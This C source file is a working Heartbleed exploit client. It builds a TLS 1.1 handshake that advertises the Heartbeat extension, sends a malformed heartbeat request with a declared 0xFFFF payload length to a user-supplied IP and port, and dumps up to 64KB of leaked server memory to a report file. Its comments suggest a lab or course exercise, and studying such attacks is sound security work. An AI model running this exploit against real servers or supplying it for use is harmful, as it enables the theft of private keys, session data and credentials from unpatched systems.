#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <ctype.h>
#include <openssl/rand.h>

#define TLS_DICTIONARY_SIZE 11

typedef struct {
    uint8_t type;
    char* name;
} TLS_MESSAGE_ENTRY;

TLS_MESSAGE_ENTRY* create_tls_dicionary_entry(const char* _name, uint8_t _type) {
    TLS_MESSAGE_ENTRY* new_entry = (TLS_MESSAGE_ENTRY*) malloc(sizeof(TLS_MESSAGE_ENTRY));

    new_entry->type = _type;
    new_entry->name = (char*) malloc(strlen(_name) + 1);
    strcpy(new_entry->name, _name);

    return new_entry;
}
void create_tls_message_dictionary(TLS_MESSAGE_ENTRY*** dictionary){
    /**
     * 
     * RFC 5246 - https://rfc-editor.org/rfc/rfc5246#section-7.4
     * 
     * Handshake messages are supplied to
     * the TLS record layer, where they are encapsulated within one or more
     * TLSPlaintext structures, which are processed and transmitted as
     * specified by the current active session state.
     * 
     *              Handshake Types
     * 
     *      Hello Request            (0)
     *      Client Hello             (1)
     *      Server Hello             (2)
     *      Certificate              (11)
     *      Server Key Exchange      (12)
     *      Certificate Request      (13)
     *      Server Hello Done        (14)
     *      Certificate Verify       (15)
     *      Client Key Exchange      (16)
     *      Finished                 (20) | (255)
    */
    *dictionary = (TLS_MESSAGE_ENTRY**) malloc(sizeof(TLS_MESSAGE_ENTRY*) * TLS_DICTIONARY_SIZE);

    (*dictionary)[0] = create_tls_dicionary_entry("Hello Request", 0);
    (*dictionary)[1] = create_tls_dicionary_entry("Client Hello", 1);
    (*dictionary)[2] = create_tls_dicionary_entry("Server Hello", 2);
    (*dictionary)[3] = create_tls_dicionary_entry("Certificate", 11);
    (*dictionary)[4] = create_tls_dicionary_entry("Server Key Exchange", 12);
    (*dictionary)[5] = create_tls_dicionary_entry("Certificate Request", 13);
    (*dictionary)[6] = create_tls_dicionary_entry("Server Hello Done", 14);
    (*dictionary)[7] = create_tls_dicionary_entry("Certificate Verify", 15);
    (*dictionary)[8] = create_tls_dicionary_entry("Client Key Exchange", 16);
    (*dictionary)[9] = create_tls_dicionary_entry("Finished", 20);
    (*dictionary)[10] = create_tls_dicionary_entry("Finished", 255);


}
char* get_tls_entry_name(uint8_t type, TLS_MESSAGE_ENTRY** dictionary) {

    for(int i=0; i < TLS_DICTIONARY_SIZE; i++){
        if(dictionary[i]->type == type){
            return dictionary[i]->name;
        }
    }
    return NULL;
}
void hexdump(uint8_t* buffer, int num_bytes, int row_length, int to_file) {

    FILE* out;
    if(to_file) {
        out= fopen("report.txt", "w");
    }

    int index = 0;
    for(index = 0; index < num_bytes / row_length; index ++){
        uint8_t* step_buffer = (uint8_t*) malloc(row_length * sizeof(uint8_t));
        memcpy(step_buffer, buffer + index * row_length , row_length);

        if(to_file){
            fprintf(out, "%6x |", index*row_length);
        } else {
            printf("%6X |", index * row_length);
        }
        for (int i = 0; i < row_length; i++) {
            if (i > 0 && i % 4 == 0) {
                if(to_file){
                    fprintf(out," ");
                } else {
                    printf(" ");
                }
            }
            if (i < num_bytes) {
                if(to_file){
                    fprintf(out, " %02X", step_buffer[i]);
                } else {
                    printf(" %02X", step_buffer[i]);
                }
            } else {
                if(to_file){
                    fprintf(out,"   ");
                } else {
                    printf("   ");
                }
            }
        }

        if(to_file){
            fprintf(out," | ");
        } else {
            printf(" | ");
        }

        for (int i = 0; i < row_length; i++) {
            if (!isspace(step_buffer[i]) && isalnum(step_buffer[i])) {
                if(to_file){
                fprintf(out,"%c", step_buffer[i]);
                } else {
                printf("%c", step_buffer[i]);
                }
            } else {
                if(to_file){
                    fprintf(out,".");
                } else {
                    printf(".");
                }
            }
        }

        if(to_file){
            fprintf(out,"\n");
        } else {
            printf("\n");
        }

        free(step_buffer);
    }
    
    uint8_t* step_buffer = (uint8_t*) malloc((num_bytes%row_length) * sizeof(uint8_t));
    memcpy(step_buffer, buffer + index * row_length , num_bytes%row_length);

    if(to_file){
        fprintf(out,"%6X |", index * row_length);
    } else {
        printf("%6X |", index * row_length);
    }
    for (int i = 0; i < row_length; i++) {
            if (i > 0 && i % 4 == 0) {
                if(to_file){
                    fprintf(out," ");
                } else {
                    printf(" ");
                }
            }
            if (i < num_bytes % row_length) {
                if(to_file){
                    fprintf(out, " %02X", step_buffer[i]);
                } else {
                    printf(" %02X", step_buffer[i]);
                }
            } else {
                if(to_file){
                    fprintf(out,"   ");
                } else {
                    printf("   ");
                }
            }
    }

    if(to_file){
        fprintf(out, " | ");
    } else {
        printf(" | ");
    }

    for (int i = 0; i < num_bytes%row_length; i++) {
        if (!isspace(step_buffer[i]) && isalnum(step_buffer[i])) {
            if(to_file){
             fprintf(out,"%c", step_buffer[i]);
            } else {
            printf("%c", step_buffer[i]);
            }
        } else {
            if(to_file){
                fprintf(out,".");
            } else {
                printf(".");
            }
        }
    }

    printf("\n");

    free(step_buffer);

    if(to_file){
        fclose(out);
    }
}
void generate_client_hello(uint8_t** client_hello, int* client_hello_size) {

    /**
     * Record Layer Fragmentation 
     * TLSPlaintext structure
     * struct {
     *      ContentType type; ---> change_cipher_spec(0x14) || alert(0x15) || handshake(0x16) || application_data(0x17) || (0xFF)
     *      ProtocolVersion version;
     *      uint16 length;
     *      opaque fragment[TLSPlaintext.length]
     * }
     * 
    */

    uint8_t record_layer_information[] = {
        0x16,                // ContentType - Handshake (22 - 0x16)

        /**
         *  struct {
         *      uint8 major;
         *      uint8 minor;
         * } ProtocolVersion;
        */

        0x03, 0x02,          // ProtocolVersion - TLS v1.1 ( major - 0x03, minor - 0x02 )
        0x00, 0x56,          // Length of the TLSPlaintext message
    };

    /**
     * struct {
     *    HandshakeType msg_type;
     *    uint24 length;
     *    select (HandshakeType) {
     *        case hello_request:       HelloRequest;
     *        case client_hello:        ClientHello;
     *        case server_hello:        ServerHello;
     *        case certificate:         Certificate;
     *        case server_key_exchange: ServerKeyExchange;
     *        case certificate_request: CertificateRequest;
     *        case server_hello_done:   ServerHelloDone;
     *       case certificate_verify:  CertificateVerify;
     *       case client_key_exchange: ClientKeyExchange;
     *       case finished:            Finished;
     *   } body;
     * } Handshake;
     * 
    */
    uint8_t handshake_information[] = {
        0x01,                // HandshakeType - Client Hello (1)
        0x00, 0x00, 0x52,    // Length of the Handhsake type message
        0x03, 0x02,          // Client Version of the protocol - TLS v1.1
    };

    /**
     * struct {
     *      ProtocolVersion client_version;
     *      Random random;
     *      SessionID session_id;
     *      CipherSuite cipher_suites<2..2^16-2>;
     *      CompressionMethod compression_methods<1..2^8-1>;
     *      select (extensions_present) {
     *         case false:
     *             struct {};
     *        case true:
     *            Extension extensions<0..2^16-1>;
     *      };
     * } ClientHello;
     * 
    */


    *client_hello = (uint8_t*) malloc(0x5b * sizeof(uint8_t));
    memcpy(*client_hello, record_layer_information, sizeof(record_layer_information));
    memcpy(*(client_hello) + 5, handshake_information, sizeof(handshake_information));

    /**
     * struct {
     *      uint32 gmt_unix_time;
     *      opaque random_bytes[28];
     * } Random;
    */

    time_t gmt_unix_time = time(NULL);
    uint8_t* gmt_unix_time_memory_address = (uint8_t*) &gmt_unix_time;

    memset(*(client_hello) + 11, *(gmt_unix_time_memory_address+3), 1);
    memset(*(client_hello) + 12, *(gmt_unix_time_memory_address+2), 1);
    memset(*(client_hello) + 13, *(gmt_unix_time_memory_address+1), 1);
    memset(*(client_hello) + 14, *(gmt_unix_time_memory_address), 1);

    uint8_t random_bytes[28];
    int result = RAND_bytes(random_bytes, 28);
    if(result != 1) { 
        printf("Failed to generate random bytes.\n");
        exit(5);
    }
    memcpy(*(client_hello) + 15, random_bytes, 28);

    /**
     * SessionID session_id;
     * This field should be null(0x00) for a newly established TLS session.
    */
    memset(*(client_hello) + 43, 0x00, 1 );

    /**
     * CipherSuite cipher_suites<2..2^16-2>;
     * This field uses 2 bytes for the length of all considered CipherSuites
     * Then there is an enumeration of all the supported algorithms.
     * The list of all default and supported TLSv1.1 cipher suites comes from:
     * https://www.openssl.org/docs/man1.1.1/man1/ciphers.html
     * https://www.ibm.com/docs/en/external-auth-server/6.0.1?topic=SS4T7T_6.0.1/com.ibm.help.seas.secure.doc/      seas_supported_cipher_suites.htm
    */
    uint8_t cipher_suites[] = {
        0x00, 0x24, // Length(in bytes) of all specified cipher suites used for this session to negotiate parameters
        0xC0, 0x0A, // TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
        0xC0, 0x09, // TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
        0xC0, 0x14, // TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
        0xC0, 0x13, // TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
        0x00, 0x35, // TLS_RSA_WITH_AES_256_CBC_SHA
        0x00, 0x0F, // TLS_RSA_WITH_AES_128_CBC_SHA
        0xC0, 0x08, // TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
        0xC0, 0x12, // TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
        0xC0, 0x07, // TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
        0xC0, 0x11, // TLS_ECDHE_RSA_WITH_RC4_128_SHA
        0x00, 0x0A, // TLS_RSA_WITH_3DES_EDE_CBC_SHA
        0x00, 0x05, // TLS_RSA_WITH_RC4_128_SHA
        0x00, 0x04, // TLS_RSA_WITH_RC4_128_MD5
        0x00, 0x02, // TLS_RSA_WITH_NULL_SHA
        0x00, 0x01, // TLS_RSA_WITH_NULL_MD5
        0xC0, 0x06, // TLS_ECDHE_ECDSA_WITH_NULL_SHA
        0xC0, 0x10, // TLS_ECDHE_RSA_WITH_NULL_SHA
        0x00, 0xFF, // Undefined
    };
    memcpy(*(client_hello) + 44, cipher_suites, sizeof(cipher_suites));

    uint8_t compression_methods[] = {
        0x01, // Compression Methods Length
        0x00, // Compression Method
    };
    memcpy(*(client_hello) + 82, compression_methods, sizeof(compression_methods));

    uint8_t extensions[] ={
        0x00, 0x05, // Extensions Length
        0x00, 0x0f, // Extension Type - Heartbeat (15)
        0x00, 0x01, // Extension Data Length
        0x01        // Extension Data
    };
    memcpy(*(client_hello) + 84, extensions, sizeof(extensions));

    *client_hello_size = 0x5B;

}
void generate_heartbeat_message(uint8_t** request){
    /**
     * 
     * Heartbeat Protocol
     * RFC 6520 - https://www.rfc-editor.org/rfc/rfc6520
     * 
     * Heartbeat - ContentType (24) -https://www.rfc-editor.org/rfc/rfc6520#section-6
     * The Heartbeat protocol is a new protocol running on top of the Record
     * Layer.  The protocol itself consists of two message types:
     * HeartbeatRequest and HeartbeatResponse.
    */

   /**
    * struct {
    *  HeartbeatMessageType type;
    *  uint16 payload_length;
    *  opaque payload[HeartbeatMessage.payload_length];
    *  opaque padding[padding_length];
    * } HeartbeatMessage;
   */

    *request = (uint8_t*) malloc(sizeof(uint8_t) * 8);

    uint8_t record_layer_information[] = {
        0x18,                // ContentType - Heartbeat (24 - 0x118)
        /**
         *  struct {
         *      uint8 major;
         *      uint8 minor;
         * } ProtocolVersion;
        */
        0x03, 0x02,          // ProtocolVersion - TLS v1.1 ( major - 0x03, minor - 0x02 )
        0x00, 0x03,          // Length of the TLSPlaintext message
    };

    memcpy(*request, record_layer_information, sizeof(record_layer_information));

    uint8_t heartbeat_message[] = {
        0x01,                // Heartbeat Message Type: Heartbeat Request (1), Heartbeat Response (2)
        /**
         * 
         * The value used for the payload length is derived from: https://www.rfc-editor.org/rfc/rfc6520#section-4
         * The total length of a HeartbeatMessage MUST NOT exceed 2^14 or
         * max_fragment_length when negotiated.
         * 
         * Because I haven't negotiated the maximum fragment length in the handshake,
         * I will take the 2^14 bytes limitation for my example.
         * 
         * 0100 0000 0000 0000 - 0x40 0x00
         * 
        */
        0xFF, 0xFF,          // Payload Length
    };

    memcpy(*(request) + 5, heartbeat_message, sizeof(heartbeat_message));


}
int recv_data(int client_socket_descriptor, uint16_t length, uint8_t *buffer)
{
    uint8_t *ptr = buffer;
    int k = 0;
    while (length > 0)
    {
        k = recv(client_socket_descriptor, ptr, length, 0);
        if (k == -1)
        {
            printf("Error while receiving data\n");
            return -1;
        }
        ptr += k;
        length -= k;
    }
    return 0;
}
void *memmem(void *haystack, size_t haystacklen, void *needle, size_t needlelen)
{
   char *bf = (char*) haystack, *pt = (char*) needle, *p = bf;
   while (needlelen <= (haystacklen - (p - bf)))
   {
      if (NULL != (p = memchr(p, (int)(*pt), haystacklen - (p - bf))))
      {
         if (0 == memcmp(p, needle, needlelen))
            return p;
         else
            ++p;
      }
      else
         break;
   }
 
   return NULL;
}

TLS_MESSAGE_ENTRY** dictionary;
int main(int argc, char* argv[]){

    /**
     * The first step in the heartbleed exploit is the:
     *   CLIENT SETUP
     *   - socket creation and configuration using command line arguments 
     *     for the vulnerable server's address and exposed port.
    */

    if(argc != 3) {
        printf("Not enough parameters identified.\nUsage: %s <ip> <port>.\n", argv[0]);
        return 1;
    }

    int client_socket_descriptor = socket(AF_INET, SOCK_STREAM, 0);
    if(client_socket_descriptor == -1) {
        printf("Client socket could not be created.\n");
        return 2;
    }
    
    struct sockaddr_in server_address;
    memset(&server_address, 0 , sizeof(server_address));

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(atoi(argv[2]));
    if(inet_pton(AF_INET,argv[1],&server_address.sin_addr) != 1){
        printf("Adress is either invalid or not supported.\n");
        return 3;
    }

    if(connect(client_socket_descriptor,(struct sockaddr*) &server_address, sizeof(server_address)) != 0){
        printf("Connection with the vulnerable server could not be established.\n");
        close(client_socket_descriptor);
        return 4;
    }

    create_tls_message_dictionary(&dictionary);
    printf("%s:%s | TCP SESSION ESTABLISHED ...\n", argv[1], argv[2]);
    printf("%s:%s | SSL HANDSHAKE IN PROGRESS ...\n", argv[1], argv[2]);
    
    /**
     *   TLS HANDSHAKE REALIZATION
     *   - socket creation and configuration using command line arguments for the vulnerable server's address and exposed port.
    */
    printf("%s:%s | SSL Handshake | CLIENT HELLO GENERATION ...\n", argv[1], argv[2]);
    uint8_t* client_hello;
    int client_hello_size;
    generate_client_hello(&client_hello, &client_hello_size);

    printf("\n%40s\n", "Client Hello");
    hexdump(client_hello, client_hello_size, 16, 0);


    printf("\n%s:%s | SSL Handshake | Sending Client Hello ...\n", argv[1], argv[2]);
    size_t n = send(client_socket_descriptor, client_hello, client_hello_size, 0);
    if (-1 == n)
    {
        printf("Error while sending HELLO\n");
        return 6;
    }
    
    /**
     * The second step in the heartbleed exploit is to finalize the TLS handshake.
     * I have handcrafted the Client Hello message request to include the Heartbeat extension.
     * In the code below, the main points are as follow:
     *      * Generate and send Client Hello to initiate Handshake
     *      * Receive server messages and show important content (e.g. Certificate)
     *      * Break the loop when Server Hello Done is received, marking the end of the handshake
    */

    while(1) {
        uint8_t record_layer_information[5];
        n = recv(client_socket_descriptor, record_layer_information, 5, 0);
        if(-1 == n){
            printf("Something went wrong when receiving Server Hello message...\n");
            return 7;
        }

        uint16_t message_length = (record_layer_information[3]<<8) + record_layer_information[4];
        uint8_t* server_message = (uint8_t*) malloc(message_length * sizeof(uint8_t));
        n = recv(client_socket_descriptor, server_message, message_length, 0);

        printf("\n%s:%s | SSL Handshake | %s (%02x) RECEIVED ... \n", \
                argv[1], \
                argv[2], \
                get_tls_entry_name(server_message[0], dictionary), \
                server_message[0]);

        uint8_t type = server_message[0];
        free(server_message);

        if(type == 0x0B) {
            /**
             * 0x0B is the Server Certificate Message type
             * In order to see the actual certificate, we need to not consider
             * all the headers
             * Hanshake Header ( 4 bytes - 1 byte is Handhsake Type + 3 bytes for Message Length)
             * Certificates Length ( 3 bytes storing the length of the certificate chain sent by the server)
             * The chain reffers to server certificate and the certificate of the CA used to sign it
             * Certificate Length ( 3 bytes storing the length of the current certificate)
             * We configured the server to store only 1 self-signed certificate
             */
            printf("\n%40s\n", "Certificate");
            hexdump(server_message + 10, message_length - 10, 16, 0);
        }
        if(type == 0x0E){
            break;
        }

    }

    printf("%s:%s | SSL HANDSHAKE FINISHED ...\n", argv[1], argv[2]);
    printf("%s:%s | Heartbleed Exploit IN PROGRESS ...\n", argv[1], argv[2]);

    uint8_t* heartbeat_request;
    generate_heartbeat_message(&heartbeat_request);


    
    // Setting a timeout interval for all read/write operations on the socket

    struct timeval timeout;      
    timeout.tv_sec = 20;
    timeout.tv_usec = 0;
    
    if (setsockopt (client_socket_descriptor, SOL_SOCKET, SO_RCVTIMEO, &timeout,
                sizeof(timeout)) < 0)
        printf("setsockopt failed\n");

    if (setsockopt (client_socket_descriptor, SOL_SOCKET, SO_SNDTIMEO, &timeout,
                sizeof(timeout)) < 0)
        printf("setsockopt failed\n");

    printf("%s:%s | Sending Heartbleed Request ...\n", argv[1], argv[2]);

        n = send(client_socket_descriptor, heartbeat_request, 8, 0);
        if(-1 == n){
            printf("Something went wrong when sending Heartbeat Request message...\n");
            return 8;
        }


    uint8_t record_layer_information[5];
    n = recv(client_socket_descriptor, record_layer_information, 5, 0);
    if(-1 == n){
        printf("Something went wrong when receiving Heartbeat Response message...\n");
        return 7;
    }
    if(record_layer_information[0] == 0x18 ) {
        uint16_t message_length = 0xFFFF;
        uint8_t* server_message = (uint8_t*) malloc(message_length * sizeof(uint8_t));
        n = recv_data(client_socket_descriptor, message_length, server_message);
        uint8_t haystack[] ={
            0x75, 0x73, 0x65, 0x72
        };
        char* p = memmem(server_message, 0xFFFF, haystack, sizeof(haystack));
        if(p != NULL){
            printf("\nInformation leak detected...\n");
            printf("Exploit ended successfully.\n\n");
        }
        printf("%s:%s | Heartbleed Response RECEIVED ...\n", argv[1], argv[2]);
        hexdump(server_message, message_length , 16, 1);
        free(server_message);
    }
    

    close(client_socket_descriptor);

    return 0;
}